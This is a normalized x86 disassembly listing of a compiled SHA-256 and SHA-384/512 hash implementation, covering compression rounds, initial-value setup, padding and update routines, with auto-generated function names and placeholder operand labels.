rol edx 0x7
xor ebx edx
mov edx ecx
mov [ esp + 0x70 ] esi
mov esi [ esp + 0x28 ]
not edx
and edx esi
mov esi [ esp + 0x20 ]
and esi ecx
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx [ r--data ]
add edx esi
mov esi [ esp + 0x24 ]
add edx ebx
add edx esi
mov [ esp + 0x10 ] edx
add edi edx
mov edx [ esp + 0x1c ]
mov ebx edx
mov esi edx
rol ebx 0x1e
rol esi 0x13
xor ebx esi
mov esi edx
rol esi 0xa
xor ebx esi
mov esi [ esp + 0x14 ]
xor esi edx
mov [ esp + 0x30 ] ebx
mov ebx [ esp + 0x14 ]
and esi ebp
and ebx edx
mov edx [ esp + 0x10 ]
mov [ esp + 0x18 ] esi
xor esi ebx
mov ebx [ esp + 0x30 ]
add edx ebx
mov ebx edi
add esi edx
xor edx edx
mov dl [ eax ]
mov [ esp + 0x24 ] esi
mov esi edx
xor edx edx
mov dl [ eax + 0x1 ]
shl esi 0x18
inc eax
shl edx 0x10
or esi edx
inc eax
xor edx edx
mov dh [ eax ]
or esi edx
inc eax
xor edx edx
mov dl [ eax ]
or esi edx
mov edx edi
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx edi
rol edx 0x7
xor ebx edx
mov edx edi
mov [ esp + 0x10 ] esi
mov [ esp + 0x74 ] esi
mov esi [ esp + 0x20 ]
inc eax
not edx
and edx esi
mov esi ecx
and esi edi
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx [ esp + 0x28 ]
add edx esi
mov esi [ r--data ]
add edx esi
mov esi [ esp + 0x24 ]
add edx ebx
mov ebx [ esp + 0x1c ]
add ebp edx
mov [ esp + 0x10 ] edx
mov edx ebx
and ebx esi
xor edx esi
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] edx
mov ebx esi
mov edx esi
mov [ esp + 0x2c ] ebp
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx [ esp + 0x40 ]
rol esi 0xa
xor ebx esi
mov esi [ esp + 0x14 ]
and edx esi
mov esi [ esp + 0x3c ]
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx ebp
add edx esi
mov [ esp + 0x28 ] edx
xor edx edx
mov dl [ eax ]
mov esi edx
xor edx edx
mov dl [ eax + 0x1 ]
shl esi 0x18
inc eax
shl edx 0x10
or esi edx
inc eax
xor edx edx
mov dh [ eax ]
or esi edx
inc eax
xor edx edx
mov dl [ eax ]
or esi edx
mov edx ebp
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx ebp
rol edx 0x7
xor ebx edx
mov edx ebp
mov [ esp + 0x10 ] esi
mov [ esp + 0x78 ] esi
not edx
mov esi edi
and edx ecx
and esi ebp
inc eax
xor edx esi
mov esi [ esp + 0x10 ]
add esi ebx
mov ebx [ r--data ]
add edx esi
mov esi [ esp + 0x20 ]
add edx ebx
mov ebx [ esp + 0x14 ]
add edx esi
mov [ esp + 0x10 ] edx
add ebx edx
mov edx [ esp + 0x28 ]
mov [ esp + 0x14 ] ebx
mov ebx edx
mov esi edx
rol ebx 0x1e
rol esi 0x13
xor ebx esi
mov esi edx
rol esi 0xa
xor ebx esi
mov esi [ esp + 0x40 ]
and esi edx
mov edx [ esp + 0x3c ]
xor esi edx
mov edx [ esp + 0x10 ]
add edx ebx
xor ebx ebx
add esi edx
xor edx edx
mov dl [ eax ]
mov bl [ eax + 0x1 ]
shl edx 0x18
inc eax
shl ebx 0x10
or edx ebx
inc eax
xor ebx ebx
mov bh [ eax ]
or edx ebx
inc eax
xor ebx ebx
mov bl [ eax ]
or edx ebx
inc eax
mov [ esp + 0x10 ] edx
mov [ esp + 0x7c ] edx
mov edx [ esp + 0x14 ]
mov ebx edx
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx [ esp + 0x14 ]
rol edx 0x7
xor ebx edx
mov edx [ esp + 0x14 ]
not edx
and edx edi
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x14 ]
and ebp edx
mov edx [ esp + 0x18 ]
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x10 ]
xor edx ebp
mov ebp [ esp + 0x18 ]
add ebx ebp
mov ebp [ esp + 0x28 ]
add edx ebx
mov ebx [ r--data ]
add edx ebx
mov ebx [ esp + 0x1c ]
add edx ecx
mov ecx esi
add ebx edx
mov [ esp + 0x10 ] edx
mov [ esp + 0x1c ] ebx
mov ebx esi
rol ebx 0x1e
rol ecx 0x13
mov edx esi
xor ebx ecx
rol edx 0xa
xor ebx edx
mov edx [ esp + 0x24 ]
mov ecx esi
xor ecx edx
and ecx ebp
mov ebp esi
and ebp edx
mov edx [ esp + 0x10 ]
xor ecx ebp
add edx ebx
add ecx edx
xor edx edx
mov dl [ eax ]
mov ebp edx
xor edx edx
mov dl [ eax + 0x1 ]
shl ebp 0x18
inc eax
shl edx 0x10
or ebp edx
inc eax
xor edx edx
mov dh [ eax ]
or ebp edx
inc eax
xor edx edx
mov dl [ eax ]
or ebp edx
mov edx [ esp + 0x1c ]
mov [ esp + 0x10 ] ebp
mov [ esp + 0x80 ] ebp
mov ebp edx
mov ebx edx
rol ebp 0x1a
rol ebx 0x15
xor ebp ebx
mov ebx edx
rol ebx 0x7
xor ebp ebx
mov ebx [ esp + 0x2c ]
not edx
and edx ebx
mov ebx [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x1c ]
and ebx edx
mov edx [ esp + 0x18 ]
xor edx ebx
mov ebx [ esp + 0x10 ]
add ebx ebp
mov ebp [ r--data ]
add edx ebx
mov ebx ecx
add edx ebp
mov ebp [ esp + 0x24 ]
add edx edi
mov edi ecx
add ebp edx
inc eax
rol edi 0x1e
rol ebx 0x13
xor edi ebx
mov ebx ecx
mov [ esp + 0x24 ] ebp
mov ebp esi
rol ebx 0xa
xor edi ebx
mov ebx [ esp + 0x28 ]
xor ebp ecx
add edx edi
and ebp ebx
mov ebx esi
and ebx ecx
xor ebp ebx
add ebp edx
xor edx edx
mov dl [ eax ]
mov [ esp + 0x20 ] ebp
mov edi edx
xor edx edx
mov dl [ eax + 0x1 ]
shl edi 0x18
inc eax
shl edx 0x10
or edi edx
inc eax
xor edx edx
mov dh [ eax ]
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
or edi edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x10 ] edi
mov [ esp + 0x84 ] edi
mov ebx edx
mov edi edx
inc eax
rol ebx 0x1a
rol edi 0x15
xor ebx edi
mov edi edx
rol edi 0x7
xor ebx edi
mov edi [ esp + 0x14 ]
not edx
and edx edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x24 ]
and edi edx
mov edx [ esp + 0x18 ]
xor edx edi
mov edi [ esp + 0x10 ]
add edi ebx
mov ebx [ esp + 0x2c ]
add edx edi
mov edi [ r--data ]
add edx edi
mov edi [ esp + 0x28 ]
add edx ebx
mov ebx ebp
add edi edx
mov [ esp + 0x10 ] edx
mov edx ebp
mov [ esp + 0x28 ] edi
rol ebx 0x1e
rol edx 0x13
xor ebx edx
mov edx ebp
rol edx 0xa
xor ebx edx
mov edx ecx
xor edx ebp
mov edi ecx
and edx esi
and edi ebp
xor edx edi
mov edi [ esp + 0x10 ]
add edi ebx
add edx edi
mov [ esp + 0x2c ] edx
xor edx edx
mov dl [ eax ]
mov edi edx
xor edx edx
mov dl [ eax + 0x1 ]
shl edi 0x18
inc eax
shl edx 0x10
or edi edx
inc eax
xor edx edx
mov dh [ eax ]
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
or edi edx
mov edx [ esp + 0x28 ]
mov [ esp + 0x10 ] edi
mov [ esp + 0x88 ] edi
mov ebx edx
mov edi edx
rol ebx 0x1a
rol edi 0x15
xor ebx edi
mov edi edx
rol edi 0x7
inc eax
xor ebx edi
mov edi [ esp + 0x1c ]
not edx
and edx edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x24 ]
and edi edx
mov edx [ esp + 0x18 ]
xor edx edi
mov edi [ esp + 0x10 ]
add edi ebx
mov ebx [ r--data ]
add edx edi
mov edi [ esp + 0x14 ]
add edx ebx
add edx edi
add esi edx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x2c ]
mov ebx edx
mov edi edx
rol ebx 0x1e
rol edi 0x13
xor ebx edi
mov edi edx
rol edi 0xa
xor ebx edi
mov edi ebp
xor edi edx
and edi ecx
mov [ esp + 0x18 ] edi
mov edi ebp
and edi edx
mov edx [ esp + 0x18 ]
xor edx edi
mov edi [ esp + 0x10 ]
add edi ebx
mov ebx esi
add edx edi
mov [ esp + 0x14 ] edx
xor edx edx
mov dl [ eax ]
mov edi edx
xor edx edx
mov dl [ eax + 0x1 ]
shl edi 0x18
inc eax
shl edx 0x10
or edi edx
inc eax
xor edx edx
mov dh [ eax ]
or edi edx
inc eax
xor edx edx
mov dl [ eax ]
or edi edx
mov edx esi
rol ebx 0x1a
rol edx 0x15
xor ebx edx
mov edx esi
rol edx 0x7
xor ebx edx
mov edx esi
mov [ esp + 0x10 ] edi
mov [ esp + 0x8c ] edi
mov edi [ esp + 0x24 ]
inc eax
not edx
and edx edi
mov edi [ esp + 0x28 ]
and edi esi
xor edx edi
mov edi [ esp + 0x10 ]
add edi ebx
mov ebx [ r--data ]
add edx edi
mov edi [ esp + 0x1c ]
add edx ebx
add edx edi
mov [ esp + 0x10 ] edx
add ecx edx
mov edx [ esp + 0x14 ]
mov ebx edx
mov edi edx
rol ebx 0x1e
rol edi 0x13
xor ebx edi
mov edi edx
rol edi 0xa
xor ebx edi
mov edi [ esp + 0x2c ]
xor edi edx
and edi ebp
mov ebp [ esp + 0x2c ]
and ebp edx
mov edx [ esp + 0x10 ]
add edx ebx
xor edi ebp
add edi edx
xor edx edx
mov dl [ eax ]
mov ebx [ esp + 0x28 ]
mov ebp edx
xor edx edx
mov dl [ eax + 0x1 ]
shl ebp 0x18
inc eax
shl edx 0x10
or ebp edx
inc eax
xor edx edx
mov dh [ eax ]
or ebp edx
inc eax
xor edx edx
mov dl [ eax ]
or ebp edx
mov edx ecx
mov [ esp + 0x10 ] ebp
mov [ esp + 0x90 ] ebp
mov ebp ecx
inc eax
rol ebp 0x1a
rol edx 0x15
xor ebp edx
mov edx ecx
rol edx 0x7
xor ebp edx
mov edx ecx
not edx
and edx ebx
mov ebx esi
and ebx ecx
xor edx ebx
mov ebx [ esp + 0x10 ]
add ebx ebp
mov ebp [ esp + 0x24 ]
add edx ebx
mov ebx [ r--data ]
add edx ebx
mov ebx [ esp + 0x20 ]
add edx ebp
mov ebp edi
mov [ esp + 0x10 ] edx
add ebx edx
mov edx edi
mov [ esp + 0x20 ] ebx
rol ebp 0x1e
rol edx 0x13
xor ebp edx
mov ebx [ esp + 0x2c ]
mov edx edi
rol edx 0xa
xor ebp edx
mov edx [ esp + 0x14 ]
xor edx edi
and edx ebx
mov ebx [ esp + 0x14 ]
and ebx edi
xor edx ebx
mov ebx [ esp + 0x10 ]
add ebx ebp
add edx ebx
mov [ esp + 0x34 ] r--data
mov [ esp + 0x24 ] edx
mov edx 0x11
mov [ esp + 0x38 ] edx
pop edi
pop esi
pop ebp
pop ebx
sub_1003c6c0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax ] 0xc1059ed8
mov [ eax + 0x8 ] 0x367cd507
mov [ eax + 0x10 ] 0x3070dd17
mov [ eax + 0x18 ] 0xf70e5939
mov [ eax + 0x20 ] 0xffc00b31
mov [ eax + 0x28 ] 0x68581511
mov [ eax + 0x30 ] 0x64f98fa7
mov [ eax + 0x38 ] 0xbefa4fa4
mov [ eax + 0x40 ] ecx
mov [ eax + 0x48 ] ecx
mov [ eax + 0x4 ] 0xcbbb9d5d
mov [ eax + 0xc ] 0x629a292a
mov [ eax + 0x14 ] 0x9159015a
mov [ eax + 0x1c ] 0x152fecd8
mov [ eax + 0x24 ] 0x67332667
mov [ eax + 0x2c ] 0x8eb44a87
mov [ eax + 0x34 ] 0xdb0c2e0d
mov [ eax + 0x3c ] 0x47b5481d
mov [ eax + 0x44 ] ecx
mov [ eax + 0x4c ] ecx
mov [ eax + 0xd0 ] ecx
mov [ eax + 0xd4 ] 0x30
mov eax 0x1
retn
sub_1003c760
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax ] 0xf3bcc908
mov [ eax + 0x8 ] 0x84caa73b
mov [ eax + 0x10 ] 0xfe94f82b
mov [ eax + 0x18 ] 0x5f1d36f1
mov [ eax + 0x20 ] 0xade682d1
mov [ eax + 0x28 ] 0x2b3e6c1f
mov [ eax + 0x30 ] 0xfb41bd6b
mov [ eax + 0x38 ] 0x137e2179
mov [ eax + 0x40 ] ecx
mov [ eax + 0x48 ] ecx
mov [ eax + 0x4 ] 0x6a09e667
mov [ eax + 0xc ] 0xbb67ae85
mov [ eax + 0x14 ] 0x3c6ef372
mov [ eax + 0x1c ] 0xa54ff53a
mov [ eax + 0x24 ] 0x510e527f
mov [ eax + 0x2c ] 0x9b05688c
mov [ eax + 0x34 ] 0x1f83d9ab
mov [ eax + 0x3c ] 0x5be0cd19
mov [ eax + 0x44 ] ecx
mov [ eax + 0x4c ] ecx
mov [ eax + 0xd0 ] ecx
mov [ eax + 0xd4 ] 0x40
mov eax 0x1
retn
sub_1003c800
mov eax 0x8
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
push edi
mov edi [ ebx + 0xd0 ]
lea esi [ ebx + 0x50 ]
inc edi
cmp edi 0x70
mov [ edi + esi - 0x1 ] 0x80
jbe r-xdata
mov ecx 0x70
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov al [ ebx + 0x40 ]
mov ecx 0x8
mov [ esi + 0x7f ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
call sub_1001d150
mov [ esi + 0x7e ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov ecx 0x10
call sub_1001d150
mov [ esi + 0x7d ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov ecx 0x18
call sub_1001d150
mov [ esi + 0x7c ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov ecx 0x20
call sub_1001d150
mov [ esi + 0x7b ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov ecx 0x28
call sub_1001d150
mov [ esi + 0x7a ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov ecx 0x30
call sub_1001d150
mov [ esi + 0x79 ] al
mov eax [ ebx + 0x40 ]
mov edx [ ebx + 0x44 ]
mov ecx 0x38
call sub_1001d150
mov [ esi + 0x78 ] al
mov cl [ ebx + 0x48 ]
mov [ esi + 0x77 ] cl
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov ecx 0x8
call sub_1001d150
mov [ esi + 0x76 ] al
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov ecx 0x10
call sub_1001d150
mov [ esi + 0x75 ] al
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov ecx 0x18
call sub_1001d150
mov [ esi + 0x74 ] al
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov ecx 0x20
call sub_1001d150
mov [ esi + 0x73 ] al
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov ecx 0x28
call sub_1001d150
mov [ esi + 0x72 ] al
mov eax [ ebx + 0x48 ]
mov edx [ ebx + 0x4c ]
mov ecx 0x30
call sub_1001d150
mov [ esi + 0x71 ] al
mov eax [ ebx + 0x48 ]
mov ecx 0x38
mov edx [ ebx + 0x4c ]
call sub_1001d150
push 0x1
push esi
push ebx
mov [ esi + 0x70 ] al
call sub_1003cbe0
mov esi [ esp + 0x28 ]
add esp 0xc
test esi esi
jne r-xdata
mov ecx 0x80
xor eax eax
sub ecx edi
add edi esi
mov edx ecx
push 0x1
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebx
[ edi ]
xor edi edi
call sub_1003cbe0
add esp 0xc
mov eax [ ebx + 0xd4 ]
cmp eax 0x30
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov ebp ebx
mov [ esp + 0x20 ] 0x6
cmp eax 0x40
je r-xdata
mov edi [ ebp + 0x4 ]
mov ebx [ ebp ]
mov eax edi
mov ecx edi
shr eax 0x18
mov [ esi ] al
inc esi
shr ecx 0x10
mov [ esi ] cl
mov edx edi
inc esi
mov [ esp + 0x14 ] edi
mov al [ esp + 0x14 ]
mov ecx 0x18
shr edx 0x8
mov [ esi ] dl
inc esi
mov edx edi
mov [ esi ] al
mov eax ebx
inc esi
call sub_1001d150
mov [ esi ] al
mov ecx 0x10
mov eax ebx
mov edx edi
inc esi
call sub_1001d150
mov [ esi ] al
mov ecx 0x8
mov eax ebx
mov edx edi
inc esi
call sub_1001d150
mov [ esi ] al
mov eax [ esp + 0x20 ]
inc esi
add ebp 0x8
mov [ esi ] bl
inc esi
dec eax
mov [ esp + 0x20 ] eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
mov ebp ebx
mov [ esp + 0x20 ] 0x8
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov edi [ ebp + 0x4 ]
mov ebx [ ebp ]
mov edx edi
mov eax edi
shr edx 0x18
mov [ esi ] dl
inc esi
shr eax 0x10
mov [ esi ] al
mov ecx edi
inc esi
mov [ esp + 0x14 ] edi
mov dl [ esp + 0x14 ]
mov eax ebx
shr ecx 0x8
mov [ esi ] cl
inc esi
mov ecx 0x18
mov [ esi ] dl
mov edx edi
inc esi
call sub_1001d150
mov [ esi ] al
mov ecx 0x10
mov eax ebx
mov edx edi
inc esi
call sub_1001d150
mov [ esi ] al
mov ecx 0x8
mov eax ebx
mov edx edi
inc esi
call sub_1001d150
mov [ esi ] al
mov eax [ esp + 0x20 ]
inc esi
add ebp 0x8
mov [ esi ] bl
inc esi
dec eax
mov [ esp + 0x20 ] eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
sub_1003cac0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov edi [ esp + 0x18 ]
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov esi [ ebx + 0x44 ]
push 0x0
push 0x8
push 0x0
push ebp
call sub_1001d090
mov ecx [ ebx + 0x40 ]
add eax ecx
adc edx esi
cmp edx esi
ja r-xdata
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] edx
mov edx [ ebx + 0xd0 ]
test edx edx
je r-xdata
jb r-xdata
cmp ebp 0x80
jb r-xdata
mov eax 0x80
sub eax edx
cmp ebp eax
jae r-xdata
mov esi [ ebx + 0x48 ]
add esi 0x1
mov [ ebx + 0x48 ] esi
mov ecx [ ebx + 0x4c ]
adc ecx 0x0
mov [ ebx + 0x4c ] ecx
cmp eax ecx
jae r-xdata
test ebp ebp
je r-xdata
mov edx ebp
shr edx 0x7
push edx
push edi
push ebx
call sub_1003cbe0
add edi ebp
and ebp 0x7f
add esp 0xc
sub edi ebp
mov esi [ esp + 0x18 ]
mov ecx eax
lea edi [ edx + ebx + 0x50 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
sub ebp eax
and ecx 0x3
push 0x1
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov [ ebx + 0xd0 ] 0x0
lea edi [ eax + ecx ]
lea eax [ ebx + 0x50 ]
push eax
push ebx
call sub_1003cbe0
add esp 0xc
mov esi [ esp + 0x18 ]
mov ecx ebp
mov eax ecx
lea edi [ edx + ebx + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0xd0 ]
pop edi
add eax ebp
pop esi
mov [ ebx + 0xd0 ] eax
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx ebp
mov esi edi
mov eax ecx
lea edi [ ebx + 0x50 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx + 0xd0 ] ebp
sub_1003cbe0
mov eax 0x124
call sub_1001d0d0
mov ecx [ esp + 0x130 ]
mov eax ecx
dec ecx
test eax eax
je r-xdata
add esp 0x124
retn
mov edx [ esp + 0x12c ]
mov eax [ esp + 0x128 ]
push ebx
add edx 0x10
push ebp
inc ecx
push esi
push edi
mov [ esp + 0x78 ] edx
mov [ esp + 0xb0 ] ecx
mov ecx eax
xor ebp ebp
and ecx 0xf
mov edx [ esp + ecx * 8 + 0xb4 ]
lea ecx [ esp + ecx * 8 + 0xb4 ]
mov [ esp + 0x6c ] edx
lea edx [ eax - 0x3 ]
mov [ esp + 0xa4 ] ecx
mov ecx [ ecx + 0x4 ]
and edx 0xf
mov [ esp + 0x70 ] ecx
mov esi [ esp + edx * 8 + 0xb4 ]
mov edi [ esp + edx * 8 + 0xb8 ]
lea ecx [ esp + edx * 8 + 0xb4 ]
mov ebx esi
mov [ esp + 0x74 ] ecx
lea ecx [ eax - 0x7 ]
dec eax
mov [ esp + 0xa8 ] ecx
and eax 0xf
mov ecx 0x13
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
lea edx [ esp + eax * 8 + 0xb4 ]
mov eax esi
mov [ esp + 0xac ] edx
mov edx edi
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x14 ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x10 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x10 ]
mov esi [ esp + 0x14 ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x68 ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x7c ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x14 ] ebx
mov ebx esi
mov [ esp + 0x10 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
or ebp eax
or ebx edx
xor esi ebp
xor edi ebx
mov ecx 0x7
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x70 ]
call sub_1001d150
mov ecx [ esp + 0x68 ]
xor edi edx
mov edx [ esp + 0x7c ]
xor esi eax
mov eax [ esp + 0xa8 ]
add edx esi
adc ecx edi
dec eax
and eax 0xf
mov ebp [ esp + eax * 8 + 0xb4 ]
add edx ebp
mov ebp [ esp + 0x2c ]
mov ebx [ esp + eax * 8 + 0xb8 ]
mov eax [ esp + 0xac ]
adc ecx ebx
mov ebx [ esp + 0x28 ]
mov edi [ eax ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x68 ] eax
mov [ esp + 0x7c ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x68 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x7c ]
or eax edx
mov edx [ esp + 0x2c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x2c ]
or ebp eax
mov eax [ esp + 0x28 ]
or ebx edx
mov edx eax
xor esi ebp
mov ebp [ esp + 0x40 ]
xor edi ebx
not edx
mov ebx ecx
and edx ebp
mov ebp [ esp + 0x44 ]
not ebx
and ebx ebp
mov ebp [ esp + 0x30 ]
and ebp eax
mov eax [ esp + 0x34 ]
and eax ecx
xor edx ebp
xor ebx eax
mov eax [ esp + 0x90 ]
add esi edx
mov edx [ eax - 0x4 ]
adc edi ebx
mov ebx [ eax - 0x8 ]
add esi ebx
mov eax [ esp + 0xac ]
mov ebx [ esp + 0x48 ]
adc edi edx
mov edx [ esp + 0x4c ]
mov ecx [ eax ]
mov ebp [ eax + 0x4 ]
mov eax [ esp + 0x3c ]
add esi ecx
mov ecx [ esp + 0x38 ]
adc edi ebp
add esi ebx
adc edi edx
add ecx esi
mov edx [ esp + 0x54 ]
mov [ esp + 0x38 ] ecx
mov ecx [ esp + 0x50 ]
mov [ esp + 0x18 ] esi
mov esi [ esp + 0x58 ]
mov [ esp + 0x1c ] edi
adc eax edi
mov edi [ esp + 0x5c ]
mov [ esp + 0x3c ] eax
mov eax ecx
xor eax esi
mov ebx esi
mov [ esp + 0x9c ] eax
mov eax edx
xor eax edi
xor ebp ebp
mov [ esp + 0xa0 ] eax
mov eax ecx
and eax esi
mov ecx 0x1c
mov [ esp + 0x94 ] eax
mov eax edx
and eax edi
mov edx edi
mov [ esp + 0x98 ] eax
mov eax esi
shl ebx 0x4
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x7c ] ebx
mov ebx edi
shr ebx 0x2
mov [ esp + 0x68 ] ebx
mov ecx 0x1e
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x68 ]
mov esi [ esp + 0x7c ]
or ecx eax
mov eax [ esp + 0x58 ]
or ebx edx
xor ebp ecx
xor esi ebx
mov edx edi
mov ecx 0x19
xor ebx ebx
shr edi 0x7
call sub_1006b020
mov ecx [ esp + 0x94 ]
or ebx edx
mov edx [ esp + 0x9c ]
or edi eax
mov eax [ esp + 0xa0 ]
xor esi ebx
mov ebx [ esp + 0x20 ]
xor ebp edi
mov edi [ esp + 0x24 ]
and edx ebx
mov ebx [ esp + 0x98 ]
and eax edi
xor edx ecx
xor eax ebx
add ebp edx
adc esi eax
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x8c ]
mov ebx [ esp + 0x1c ]
add ebp eax
lea edx [ ecx + 0x1 ]
mov [ esp + 0x48 ] ebp
adc esi ebx
and edx 0xf
add ecx 0xfffffffe
mov [ esp + 0x4c ] esi
lea eax [ esp + edx * 8 + 0xb4 ]
and ecx 0xf
mov [ esp + 0x14 ] eax
xor ebp ebp
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov esi [ esp + ecx * 8 + 0xb4 ]
mov edi [ esp + ecx * 8 + 0xb8 ]
mov [ esp + 0x70 ] eax
lea eax [ esp + ecx * 8 + 0xb4 ]
mov [ esp + 0x6c ] edx
mov [ esp + 0x88 ] eax
mov ebx esi
mov ecx 0x13
mov eax esi
mov edx edi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] edi
shl ebx 0xd
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x7c ] ebx
mov ebx edi
shr ebx 0x1d
mov [ esp + 0x68 ] ebx
mov ecx 0x3
mov eax esi
mov edx edi
xor ebx ebx
call sub_1006b020
mov ecx [ esp + 0x68 ]
mov esi [ esp + 0x7c ]
or ecx eax
mov eax [ esp + 0x80 ]
or ebx edx
xor ebp ecx
mov ecx 0x6
mov edx edi
xor esi ebx
call sub_1001d150
mov edi [ esp + 0x70 ]
xor esi edx
mov [ esp + 0x60 ] esi
mov esi [ esp + 0x6c ]
xor ebp eax
mov ebx esi
mov [ esp + 0x10 ] ebp
mov ecx 0x8
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x18
call sub_1001d150
or ebx edx
or ebp eax
mov [ esp + 0x7c ] ebx
mov ebx esi
mov [ esp + 0x68 ] ebp
mov ecx 0x1
mov eax esi
mov edx edi
xor ebp ebp
shl ebx 0x1f
call sub_1001d150
mov esi [ esp + 0x68 ]
mov edi [ esp + 0x7c ]
or ebp eax
or ebx edx
xor esi ebp
xor edi ebx
mov ecx 0x7
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x70 ]
call sub_1001d150
mov ecx [ esp + 0x60 ]
xor edi edx
mov edx [ esp + 0x10 ]
xor esi eax
mov eax [ esp + 0xa8 ]
add edx esi
adc ecx edi
and eax 0xf
mov ebp [ esp + eax * 8 + 0xb4 ]
add edx ebp
mov ebp [ esp + 0x3c ]
mov ebx [ esp + eax * 8 + 0xb8 ]
mov eax [ esp + 0xa4 ]
adc ecx ebx
mov ebx [ esp + 0x38 ]
mov edi [ eax ]
add edi edx
mov edx ebp
mov [ eax ] edi
mov esi [ eax + 0x4 ]
adc esi ecx
mov ecx 0x17
mov [ eax + 0x4 ] esi
mov esi ebp
mov eax ebx
xor edi edi
shr esi 0x9
call sub_1006b020
or edi edx
mov edx ebx
or esi eax
xor eax eax
shl edx 0xe
mov [ esp + 0x60 ] eax
mov [ esp + 0x68 ] edx
mov ecx 0x12
mov eax ebx
mov edx ebp
call sub_1001d150
mov ecx [ esp + 0x60 ]
xor ebp ebp
or ecx eax
mov eax [ esp + 0x68 ]
or eax edx
mov edx [ esp + 0x3c ]
xor esi ecx
xor edi eax
mov eax ebx
mov ecx 0xe
shl ebx 0x12
call sub_1001d150
mov ecx [ esp + 0x3c ]
or ebp eax
mov eax [ esp + 0x38 ]
or ebx edx
mov edx eax
